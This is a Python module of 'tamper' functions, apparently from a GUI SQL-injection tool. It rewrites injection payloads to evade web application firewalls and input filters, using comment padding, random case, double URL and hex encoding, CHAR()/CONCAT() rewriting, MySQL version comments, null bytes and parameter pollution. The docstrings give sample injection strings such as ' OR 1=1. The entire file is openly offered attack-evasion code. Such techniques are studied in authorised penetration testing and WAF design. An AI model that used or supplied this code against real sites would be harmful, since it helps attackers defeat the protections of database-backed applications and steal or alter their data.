"""
tamper.py - A module for payload tampering and evasion techniques.
Advanced obfuscation methods to bypass WAFs and filters.
"""

import random
import urllib.parse

def space_to_comment(payload: str) -> str:
    """
    Replaces spaces with inline comments.
    Example: 'SELECT id FROM users' -> 'SELECT/**/id/**/FROM/**/users'
    """
    return payload.replace(" ", "/**/")

def random_case(payload: str) -> str:
    """
    Applies random case to the payload.
    Example: 'SELECT' -> 'SeLeCt'
    """
    return "".join(random.choice([c.upper(), c.lower()]) for c in payload)

def space_to_random_whitespace(payload: str) -> str:
    """
    Replaces spaces with random whitespace characters.
    Example: 'SELECT' -> 'SELECT\t' or 'SELECT\n'
    """
    whitespace_chars = [' ', '\t', '\n', '\r', '\x0b', '\x0c']
    result = []
    for char in payload:
        if char == ' ':
            result.append(random.choice(whitespace_chars))
        else:
            result.append(char)
    return ''.join(result)

def inline_comments(payload: str) -> str:
    """
    Adds inline comments between SQL keywords.
    Example: 'SELECT * FROM' -> 'SELECT/**/* /**/FROM'
    """
    keywords = ['SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'UNION', 'ORDER', 'BY', 'INSERT', 'UPDATE', 'DELETE']
    result = payload
    for keyword in keywords:
        # Case-insensitive replacement
        import re
        pattern = re.compile(re.escape(keyword), re.IGNORECASE)
        result = pattern.sub(lambda m: f"/*{random.randint(0,9999)}*/{m.group(0)}/*{random.randint(0,9999)}*/", result)
    return result

def double_url_encode(payload: str) -> str:
    """
    Applies double URL encoding to bypass filters.
    Example: '\'' -> '%2527' (single encode: %27, double: %2527)
    """
    return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

def hex_encode_strings(payload: str) -> str:
    """
    Converts string literals to hex representation.
    Example: 'admin' -> 0x61646d696e
    """
    # Find strings in quotes and convert to hex
    import re
    def to_hex(match):
        text = match.group(1)
        hex_str = '0x' + text.encode().hex()
        return hex_str

    # Replace single-quoted strings
    result = re.sub(r"'([^']*)'", to_hex, payload)
    return result

def space_to_plus(payload: str) -> str:
    """
    Replaces spaces with plus signs (URL encoding alternative).
    Example: 'SELECT FROM' -> 'SELECT+FROM'
    """
    return payload.replace(" ", "+")

def random_comment_style(payload: str) -> str:
    """
    Uses random comment styles to obfuscate.
    Mixes /**/, --, # comment styles randomly.
    """
    comment_styles = ['/**/', '--\n', '# \n']
    result = payload.replace(" ", random.choice(comment_styles))
    return result

def version_comment(payload: str) -> str:
    """
    Uses MySQL version-specific comments.
    Example: 'SELECT' -> '/*!50000SELECT*/'
    """
    keywords = ['SELECT', 'FROM', 'WHERE', 'UNION', 'ORDER', 'BY']
    result = payload
    for keyword in keywords:
        import re
        pattern = re.compile(re.escape(keyword), re.IGNORECASE)
        version = random.choice(['50000', '50001', '40000', '40100'])
        result = pattern.sub(f"/*!{version}{keyword}*/", result)
    return result

def unicode_escape(payload: str) -> str:
    """
    Converts characters to Unicode escape sequences.
    Example: 'SELECT' -> '\u0053\u0045\u004c\u0045\u0043\u0054'
    """
    # Only escape SQL keywords to keep payload readable
    keywords: list[str] = ['SELECT', 'FROM', 'WHERE', 'UNION', 'AND', 'OR']
    result: str = payload
    for keyword in keywords:
        if keyword in result.upper():
            unicode_str: str = ''.join([f'\\u{ord(c):04x}' for c in keyword])
            result = result.replace(keyword, unicode_str)
            result = result.replace(keyword.lower(), unicode_str)
    return result

def space_to_hash_comment(payload: str) -> str:
    """
    Replaces spaces with hash comments (works in MySQL).
    Example: 'SELECT FROM' -> 'SELECT#comment\nFROM'
    """
    return payload.replace(" ", "#\n")

def mixed_obfuscation(payload: str) -> str:
    """
    Applies multiple obfuscation techniques randomly.
    Combines several methods for maximum evasion.
    """
    from typing import Callable, List
    techniques: List[Callable[[str], str]] = [
        lambda p: p.replace(" ", "/**/"),
        lambda p: "".join(random.choice([c.upper(), c.lower()]) for c in p),
        lambda p: p.replace(" ", "\t"),
    ]

    result = payload
    for _ in range(random.randint(2, 4)):
        technique = random.choice(techniques)
        result = technique(result)

    return result


# ═══════════════════════════════════════════════════════════
# New Tamper Scripts (Batch 2)
# ═══════════════════════════════════════════════════════════

def null_byte_injection(payload: str) -> str:
    """
    Inserts null bytes to bypass string-based filters.
    Example: "SELECT" -> "SEL%00ECT"
    """
    if len(payload) < 4:
        return payload
    mid: int = len(payload) // 2
    return str(payload[:mid]) + "%00" + str(payload[mid:])


def hpp_parameter_pollution(payload: str) -> str:
    """
    HTTP Parameter Pollution — duplicates the payload parameter.
    Example: "' OR 1=1" -> "' OR 1=1&id=' OR 1=1"
    """
    return payload + "&id=" + urllib.parse.quote(payload)


def json_encode_payload(payload: str) -> str:
    """
    Wraps payload in JSON structure for API endpoints.
    Example: "' OR 1=1" -> {"input":"' OR 1=1"}
    """
    import json
    return json.dumps({"input": payload})


def base64_encode_payload(payload: str) -> str:
    """
    Base64 encodes the payload for encoded parameter contexts.
    Example: "' OR 1=1" -> "JyBPUiAxPTE="
    """
    import base64
    return base64.b64encode(payload.encode()).decode()


def char_encode(payload: str) -> str:
    """
    Converts payload to CHAR() function calls (MySQL/MSSQL).
    Example: "admin" -> "CHAR(97,100,109,105,110)"
    """
    chars = ",".join(str(ord(c)) for c in payload)
    return f"CHAR({chars})"


def concat_encode(payload: str) -> str:
    """
    Splits string literals into CONCAT() calls.
    Example: "admin" -> "CONCAT('ad','mi','n')"
    """
    if len(payload) < 3:
        return payload
    parts: list[str] = [str(payload[i:i+2]) for i in range(0, len(payload), 2)]
    quoted: str = ",".join(f"'{p}'" for p in parts)
    return f"CONCAT({quoted})"


def between_encode(payload: str) -> str:
    """
    Replaces comparison operators with BETWEEN/NOT BETWEEN.
    Example: "AND 1=1" -> "AND 1 BETWEEN 1 AND 1"
    """
    import re
    result = re.sub(r'(\d+)\s*=\s*(\d+)', r'\1 BETWEEN \2 AND \2', payload)
    result = re.sub(r'(\d+)\s*>\s*(\d+)', r'\1 NOT BETWEEN 0 AND \2', result)
    return result


def like_encode(payload: str) -> str:
    """
    Replaces = with LIKE for filter evasion.
    Example: "OR 1=1" -> "OR 1 LIKE 1"
    """
    import re
    return re.sub(r'(\w+)\s*=\s*(\w+)', r'\1 LIKE \2', payload)


def scientific_notation(payload: str) -> str:
    """
    Converts numeric comparisons to scientific notation.
    Example: "OR 1=1" -> "OR 1e0=1e0"
    """
    import re
    return re.sub(r'\b(\d+)\b', lambda m: f"{m.group(1)}e0" if m.group(1).isdigit() else m.group(0), payload)


def chunked_transfer(payload: str) -> str:
    """
    Simulates chunked transfer encoding by splitting payload.
    Example: "UNION SELECT" -> "UNI" + "ON " + "SEL" + "ECT"
    """
    chunks: list[str] = [str(payload[i:i+3]) for i in range(0, len(payload), 3)]
    return "' + '".join(chunks)


def encoding_chain(payload: str) -> str:
    """
    Chains multiple light encoding techniques for deep evasion.
    Applies: random case → space to comment → partial URL encode.
    """
    # Step 1: Random case
    result: str = "".join(random.choice([c.upper(), c.lower()]) for c in payload)
    # Step 2: Space to inline comment
    result = result.replace(" ", "/**/")
    # Step 3: Partial URL encode (only special chars)
    special: dict[str, str] = {"'": "%27", '"': "%22", ";": "%3B", "#": "%23"}
    for char, encoded in special.items():
        if random.random() > 0.5:
            result = result.replace(char, encoded)
    return result


def get_tamper_scripts():
    """
    Returns a dictionary of available tamper scripts for the GUI.
    The key is the user-facing name, and the value is the function itself.
    """
    return {
        "None": None,
        # Original 11
        "Space to Comment": space_to_comment,
        "Random Case": random_case,
        "Space to Random Whitespace": space_to_random_whitespace,
        "Inline Comments": inline_comments,
        "Double URL Encode": double_url_encode,
        "Hex Encode Strings": hex_encode_strings,
        "Space to Plus": space_to_plus,
        "Version Comment (MySQL)": version_comment,
        "Unicode Escape": unicode_escape,
        "Space to Hash Comment": space_to_hash_comment,
        "Mixed Obfuscation": mixed_obfuscation,
        # New 11 (Batch 2)
        "Null Byte Injection": null_byte_injection,
        "HPP (Parameter Pollution)": hpp_parameter_pollution,
        "JSON Encode": json_encode_payload,
        "Base64 Encode": base64_encode_payload,
        "CHAR() Encode": char_encode,
        "CONCAT() Encode": concat_encode,
        "BETWEEN Encode": between_encode,
        "LIKE Encode": like_encode,
        "Scientific Notation": scientific_notation,
        "Chunked Transfer": chunked_transfer,
        "Encoding Chain": encoding_chain,
    }
